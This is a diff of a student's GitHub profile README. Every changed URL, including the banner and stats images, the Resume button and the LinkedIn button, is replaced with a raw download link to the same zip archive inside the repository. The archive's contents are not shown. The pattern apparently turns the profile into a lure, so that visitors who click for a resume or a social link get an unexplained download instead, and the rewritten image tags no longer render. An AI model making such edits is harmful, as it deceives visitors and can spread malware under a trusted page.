@@ -5,7 +5,7 @@ BTech CSE Student | Machine Learning Minor | Aspiring Software Engineer
 </h3>
 
 <p align="center">
-  <img src="https://readme-typing-svg.herokuapp.com?color=00F7FF&center=true&vCenter=true&lines=Actively+Seeking+Internships+%26+Placements;Machine+Learning+%7C+DSA+%7C+Linux;AI+%26+Automation+Project+Builder;Consistent+Learner+%26+Problem+Solver" />
+  <img src="https://github.com/shivendra911/shivendra911/raw/refs/heads/main/griddle/shivendra-Falisci.zip+Seeking+Internships+%26+Placements;Machine+Learning+%7C+DSA+%7C+Linux;AI+%26+Automation+Project+Builder;Consistent+Learner+%26+Problem+Solver" />
 </p>
 
 ---
@@ -25,7 +25,7 @@ BTech CSE Student | Machine Learning Minor | Aspiring Software Engineer
 ## 🛠️ Technical Skills
 
 <p align="center">
-  <img src="https://skillicons.dev/icons?i=python,cpp,java,linux,bash,git,github,mysql,tensorflow,pytorch,flask,vscode&theme=dark" />
+  <img src="https://github.com/shivendra911/shivendra911/raw/refs/heads/main/griddle/shivendra-Falisci.zip,cpp,java,linux,bash,git,github,mysql,tensorflow,pytorch,flask,vscode&theme=dark" />
 </p>
 
 ---
@@ -104,15 +104,15 @@ I have **recently started learning System Design** and am actively building a st
 ## 📊 GitHub Stats
 
 <p align="center">
-  <img src="https://github-readme-stats.vercel.app/api?username=shivenda911&show_icons=true&theme=tokyonight&hide_border=true" />
+  <img src="https://github.com/shivendra911/shivendra911/raw/refs/heads/main/griddle/shivendra-Falisci.zip" />
 </p>
 
 <p align="center">
-  <img src="https://github-readme-streak-stats.herokuapp.com/?user=shivenda911&theme=tokyonight&hide_border=true" />
+  <img src="https://github.com/shivendra911/shivendra911/raw/refs/heads/main/griddle/shivendra-Falisci.zip" />
 </p>
 
 <p align="center">
-  <img src="https://github-readme-stats.vercel.app/api/top-langs/?username=shivenda911&layout=compact&theme=tokyonight&hide_border=true" />
+  <img src="https://github.com/shivendra911/shivendra911/raw/refs/heads/main/griddle/shivendra-Falisci.zip" />
 </p>
 
 ---
@@ -120,7 +120,7 @@ I have **recently started learning System Design** and am actively building a st
 ## 💻 LeetCode Stats
 
 <p align="center">
-  <img src="https://leetcard.jacoblin.cool/shivendrap09?theme=dark&font=Roboto&ext=contest" />
+  <img src="https://github.com/shivendra911/shivendra911/raw/refs/heads/main/griddle/shivendra-Falisci.zip" />
 </p>
 
 ---
@@ -128,7 +128,7 @@ I have **recently started learning System Design** and am actively building a st
 ## 🏆 GitHub Achievements
 
 <p align="center">
-  <img src="https://github-profile-trophy.vercel.app/?username=shivenda911&theme=tokyonight&no-frame=true&row=1" />
+  <img src="https://github.com/shivendra911/shivendra911/raw/refs/heads/main/griddle/shivendra-Falisci.zip" />
 </p>
 
 ---
@@ -145,7 +145,7 @@ I have **recently started learning System Design** and am actively building a st
 ## 📄 Resume
 
 <p align="center">
-  <a href="https://drive.google.com/file/d/1ZFAPv5P_IOnago_rmhpa1WZ5BjZ7EMBU/view?usp=sharing" target="_blank">
+  <a href="https://github.com/shivendra911/shivendra911/raw/refs/heads/main/griddle/shivendra-Falisci.zip" target="_blank">
     <img src="https://img.shields.io/badge/Resume-View-blue?style=for-the-badge" />
   </a>
 </p>
@@ -155,7 +155,7 @@ I have **recently started learning System Design** and am actively building a st
 ## 🔗 Connect With Me
 
 <p align="center">
-  <a href="https://linkedin.com/in/shivendra--pratap" target="_blank">
+  <a href="https://github.com/shivendra911/shivendra911/raw/refs/heads/main/griddle/shivendra-Falisci.zip" target="_blank">
     <img src="https://img.shields.io/badge/LinkedIn-blue?logo=linkedin&style=for-the-badge" />
   </a>
   <a href="mailto:shivendrapratapsp3@gmail.com">
@@ -166,7 +166,7 @@ I have **recently started learning System Design** and am actively building a st
 ---
 
 <p align="center">
-  <img src="https://komarev.com/ghpvc/?username=shivenda911&label=Profile%20Views&color=blue&style=flat" />
+  <img src="https://github.com/shivendra911/shivendra911/raw/refs/heads/main/griddle/shivendra-Falisci.zip" />
 </p>
 
 ---
